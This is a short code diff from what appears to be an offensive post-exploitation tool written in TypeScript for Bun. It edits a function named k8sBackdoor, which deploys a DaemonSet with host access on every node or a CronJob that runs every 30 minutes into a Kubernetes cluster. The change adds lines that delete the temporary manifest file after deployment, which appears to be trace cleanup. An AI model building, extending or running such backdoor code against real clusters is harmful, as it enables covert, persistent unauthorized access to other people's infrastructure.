@@ -492,6 +492,7 @@ async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult>
     await Bun.write(tmpFile, manifest)
     output.push(`[*] Deploying DaemonSet "${name}" to ${ns}...`)
     const apply = await kcText(["apply", "-f", tmpFile], kubeconfig, ctx, timeout)
+    await run("rm", ["-f", tmpFile], 5)
     output.push(
       apply.exitCode === 0
         ? `[+] DaemonSet deployed — runs on every node with host access`
@@ -534,6 +535,7 @@ async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult>
     await Bun.write(tmpFile, manifest)
     output.push(`[*] Deploying CronJob "${name}" to ${ns}...`)
     const apply = await kcText(["apply", "-f", tmpFile], kubeconfig, ctx, timeout)
+    await run("rm", ["-f", tmpFile], 5)
     output.push(
       apply.exitCode === 0
         ? `[+] CronJob deployed — runs every 30 minutes`
